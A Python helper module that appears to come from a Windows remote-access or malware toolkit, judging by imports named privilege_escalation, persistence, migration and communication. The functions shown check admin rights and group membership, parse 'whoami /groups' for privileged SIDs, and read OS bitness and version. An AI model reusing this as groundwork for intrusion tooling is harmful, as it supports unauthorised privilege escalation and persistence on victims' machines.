from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
# Functions mostly used inside other functions.
 
def is_admin(): # Is current account admin?
    return ctypes.windll.shell32.IsUserAnAdmin() != 0
     
def ASCIIfy(string): # Remove non-ASCII characters from a string.
    return ''.join([i if ord(i) < 128 else '' for i in string])
     
def is_user_in_group(group, member): # Check if user is member of a group.
    members = win32net.NetLocalGroupGetMembers(None, group, 1)
    if ASCIIfy(member.lower()) in list(map(lambda d: ASCIIfy(d['name'].lower()), members[0])): return True
    return False
     
def name_of_admin_group(): # Get name of Administrators group.
    for line in execute.execute_command("whoami /groups").splitlines():
        if "S-1-5-32-544" in line:
            return line.split()[0].split("\\")[1]
             
def name_of_everyone_group(): # Get name of Everyone group.
    for line in execute.execute_command("whoami /groups").splitlines():
        if "S-1-1-0" in line:
            return line.split()[0].split("\\")[1]
             
 
def arch(): # Check bitness of operating system.
    try:
        os.environ["programfiles(x86)"]
        return "x64"
    except:
        return "x32"
         
def version(): # Version of operating system
    return platform.release()